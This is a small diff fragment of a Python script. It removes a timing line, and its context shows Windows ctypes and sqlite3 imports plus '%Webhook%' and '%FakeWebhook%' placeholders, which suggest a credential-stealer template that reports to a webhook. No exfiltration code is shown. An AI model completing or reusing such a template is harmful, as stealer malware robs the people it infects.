@@ -20,7 +20,6 @@ import os.path, zipfile
 import shutil, json, sqlite3
 import tempfile, datetime
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
-start_time = time.time()
 webhook = '%Webhook%' 
 
 FakeWebhook = '%FakeWebhook%'
